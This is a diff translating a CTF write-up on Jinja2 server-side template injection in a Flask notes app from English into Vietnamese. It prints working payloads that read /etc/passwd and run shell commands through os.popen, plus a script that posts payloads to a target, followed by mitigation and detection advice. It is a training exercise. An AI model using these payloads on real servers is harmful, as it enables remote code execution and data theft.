@@ -1,69 +1,69 @@
-# Challenge 17: SSTINote - Solution
+# Thử thách 17: SSTINote – Giải pháp
 
-## Vulnerability Type
-**Server-Side Template Injection (SSTI)**
+## Loại lỗ hổng
+**Server-Side Template Injection (SSTI - Lỗ hổng chèn Template phía máy chủ)**
 
-## Description
-The application renders user input directly as a Jinja2 template without sanitization, allowing attackers to execute arbitrary Python code on the server.
+## Mô tả
+Ứng dụng hiển thị trực tiếp chuỗi do người dùng nhập vào thông qua Template Engine Jinja2 mà không hề qua bước làm sạch (sanitize). Lỗ hổng này cho phép kẻ tấn công chèn các biểu thức toán học hoặc gọi các hàm Python để đạt được khả năng Thực thi mã từ xa (RCE).
 
-## Vulnerable Code
+## Mã nguồn chứa lỗ hổng
 ```python
 # VULNERABLE: user input rendered as Jinja2 template
 rendered = render_template_string(raw_input)
 ```
 
-## Exploitation Steps
+## Khai thác (Exploit)
 
-### Step 1: Verify SSTI Exists
-Test basic template syntax:
-```
+### Bước 1: Xác nhận lỗ hổng SSTI
+Kiểm tra bằng một biểu thức toán học cơ bản của Jinja2:
+```text
 {{7*7}}
 ```
-Expected output: `49`
+Nếu ứng dụng trả về `49`, lỗ hổng SSTI thực sự tồn tại.
 
-### Step 2: Access Flask Config
-The flag is stored in Flask's config:
-```
+### Bước 2: Truy cập đối tượng cấu hình của Flask (Config)
+Thông thường trong các bài CTF, Flag hay được giấu trong biến cấu hình:
+```text
 {{config}}
 ```
-This will display all configuration including the FLAG.
+Payload này sẽ in ra toàn bộ các thông số cấu hình của ứng dụng, trong đó có FLAG.
 
-### Step 3: Extract Flag Directly
-```
+### Bước 3: Trích xuất trực tiếp Flag
+```text
 {{config['FLAG']}}
 ```
-Output: `FCTF{sst1_t3mpl4t3_1nj3ct10n}`
+Kết quả: `FCTF{sst1_t3mpl4t3_1nj3ct10n}`
 
-## Advanced SSTI Payloads
+## Các Payload SSTI nâng cao (Để lấy RCE)
 
-### Read Files
+### Đọc tệp hệ thống
 ```jinja2
 {{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
 ```
 
-### Remote Code Execution (RCE)
+### Thực thi mã từ xa (RCE)
 ```jinja2
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
 ```
 
-### Alternative RCE Payload
+### Payload RCE thay thế
 ```jinja2
 {{ config.__class__.__init__.__globals__['os'].popen('cat /app/flag.txt').read() }}
 ```
 
-### List Available Classes
+### Liệt kê tất cả các Class (Class Enumeration)
 ```jinja2
 {{ ''.__class__.__mro__[1].__subclasses__() }}
 ```
 
-### Access Request Object
+### Truy cập thông qua biến request
 ```jinja2
 {{ request.application.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
 ```
 
-## Automated Exploitation
+## Khai thác tự động
 
-### Python Script
+### Script Python
 ```python
 import requests
 
@@ -77,7 +77,7 @@ payloads = [
 for payload in payloads:
     r = requests.post(url, data={"note": payload})
     if "FCTF{" in r.text:
-        print(f"Success with payload: {payload}")
+        print(f"Thành công với payload: {payload}")
         print(r.text)
         break
 ```
@@ -87,44 +87,26 @@ for payload in payloads:
 FCTF{sst1_t3mpl4t3_1nj3ct10n}
 ```
 
-## How It Works
-1. Jinja2 templates allow Python expressions in `{{ }}` blocks
-2. User input is rendered as a template without sanitization
-3. Attacker can access Python objects and methods
-4. Through object introspection, attacker gains code execution
-5. Flask's `config` object is accessible in template context
+## Cách hoạt động
+1. Template Jinja2 cho phép chạy các biểu thức Python bọc trong cặp ngoặc `{{ }}`.
+2. Dữ liệu người dùng bị đưa thẳng vào hàm render template thay vì chỉ đóng vai trò là một tham số (context).
+3. Thông qua cơ chế Introspection (Tự quan sát) của Python (`__class__`, `__globals__`), kẻ tấn công có thể leo từ một chuỗi string trống lên tận thư viện `os`.
+4. Cuối cùng, gọi hàm `os.popen()` để thực thi các lệnh hệ thống (OS Commands).
 
-## SSTI Exploitation Chain
-```
-User Input → Jinja2 Template → Python Object Access → Code Execution
-```
-
-## Mitigation
-- Never render user input as templates
-- Use template sandboxing (though it can be bypassed)
-- Separate data from templates:
+## Biện pháp phòng ngừa (Mitigation)
+- KHÔNG BAO GIỜ truyền dữ liệu đầu vào của người dùng trực tiếp vào chuỗi template (`render_template_string`).
+- Truyền dữ liệu vào template một cách an toàn thông qua các biến Context:
   ```python
   # SAFE: Pass data as variables
   render_template('note.html', user_note=raw_input)
   ```
-- Validate and sanitize all user input
-- Use a whitelist of allowed template syntax
-- Consider using a safer templating engine
-- Implement Content Security Policy (CSP)
-- Run application with minimal privileges
-- Use template auto-escaping:
+- Sử dụng môi trường Sandbox (tuy nhiên vẫn có rủi ro bị bypass).
+- Sử dụng các thư viện tự động mã hóa (Auto-escaping) như MarkupSafe:
   ```python
   from markupsafe import escape
   safe_input = escape(raw_input)
   ```
 
-## Detection
-- Look for template syntax in user input fields
-- Test with: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`
-- Monitor for unusual Python object access patterns
-- Check for attempts to access `__class__`, `__mro__`, `__subclasses__`
-
-## References
-- [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)
-- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
-- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+## Dấu hiệu nhận biết (Detection)
+- Tìm các cú pháp template trong input người dùng như: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.
+- Giám sát các chuỗi bất thường như `__class__`, `__mro__`, `__subclasses__` trong Request.
